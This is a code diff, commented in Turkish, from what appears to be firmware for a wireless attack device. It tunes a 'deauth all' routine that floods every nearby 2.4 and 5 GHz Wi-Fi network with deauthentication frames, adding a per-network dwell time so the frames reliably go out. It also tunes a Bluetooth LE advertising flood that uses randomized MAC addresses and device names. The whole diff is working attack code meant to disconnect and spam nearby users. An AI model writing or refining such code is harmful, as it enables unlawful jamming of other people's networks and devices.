@@ -816,12 +816,13 @@ void deauthAllTask(void *param) {
   };
 
 
-  // ── Deauth All maksimum hız parametreleri ──────────────────────────────────
-  const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı (daha az → daha hızlı tur)
+  // ── Deauth All hız parametreleri ──────────────────────────────────────────
+  const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı
   const int DA_FRAME_COUNT_5G   = 5;
-  const int DA_EXTRA_COUNT_2G   = 2;    // ek burst sayısı azaltıldı
+  const int DA_EXTRA_COUNT_2G   = 2;    // ek burst sayısı
   const int DA_EXTRA_COUNT_5G   = 2;
-  const int DA_CH_SWITCH_MS     = 1;    // minimum kanal geçiş süresi: 2ms→1ms
+  const int DA_CH_SWITCH_MS     = 10;   // kanal geçiş süresi: radyonun kanala kilitlenmesi için yeterli
+  const int DA_NET_DWELL_MS     = 60;   // her ağ için minimum kalma süresi: frame'lerin havaya çıkmasını garantiler
 
 #define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL  // 60s→120s: daha seyrek, saldırıyı az keser
   unsigned long deauth_all_last_scan_ms = 0;
@@ -925,6 +926,8 @@ void deauthAllTask(void *param) {
         safeSendMgnt(frame, 26); // 3× gönder — backoff yoksa çok hızlı
       }
 
+      // ── Her ağ için minimum kalma süresi: frame'lerin havaya çıkmasını garantiler
+      vTaskDelay(pdMS_TO_TICKS(DA_NET_DWELL_MS));
     }
 
 
@@ -1080,7 +1083,10 @@ void bleFloodTask(void *param) {
 static void bleSetAdv(const char *name, const uint8_t *data, uint8_t data_len, bool is_svc) {
   BLEAdvert *pAdv = BLE.configAdvert();
   pAdv->stopAdv();
-  vTaskDelay(pdMS_TO_TICKS(3)); // minimum stop bekleme: 8ms→3ms
+  vTaskDelay(pdMS_TO_TICKS(5)); // stop sonrası GAP stack'in temizlenmesi için
+
+  // ── GAP cihaz adını güncelle: tarayıcılar hem GAP adını hem scan response'u gösterir
+  BLE.setDeviceName(name);
 
   // ── Rastgele MAC: her çağrı = farklı cihaz ──────────────────────────────
   uint8_t rand_addr[6];
@@ -1101,16 +1107,16 @@ static void bleSetAdv(const char *name, const uint8_t *data, uint8_t data_len, b
   memcpy(pkt + 1, data, data_len);
   advData.addData(pkt, data_len + 1);
 
-  // ── Scan response: isim ─────────────────────────────────────────────────
+  // ── Scan response: isim (hem complete hem shortened name) ───────────────
   BLEAdvertData scanData;
   scanData.addCompleteName(name);
 
   pAdv->setAdvData(advData);
   pAdv->setScanRspData(scanData);
-  pAdv->setMinInterval(0x10); // 10ms — 0x20(20ms)→0x10: 2× daha fazla paket/sn
+  pAdv->setMinInterval(0x10); // 10ms
   pAdv->setMaxInterval(0x10);
   pAdv->startAdv();
-  vTaskDelay(pdMS_TO_TICKS(2)); // minimum start bekleme: 5ms→2ms
+  vTaskDelay(pdMS_TO_TICKS(3)); // start sonrası stack'in aktive olması için
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
